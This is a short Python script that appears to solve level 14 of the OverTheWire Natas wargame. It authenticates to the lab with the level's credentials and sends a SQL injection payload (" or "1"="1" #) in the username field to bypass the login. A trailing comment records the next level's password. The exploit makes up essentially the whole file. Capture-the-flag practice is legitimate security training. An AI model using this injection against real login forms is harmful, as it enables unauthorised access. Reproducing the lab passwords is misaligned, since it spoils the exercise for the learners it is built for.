import requests
import base64

username="natas14"
password="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url=str("http://%s.natas.labs.overthewire.org" %username)

r=requests.post(url,auth=(username,password),data={'username':'" or "1"="1" #'})

print(r.text)
# Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

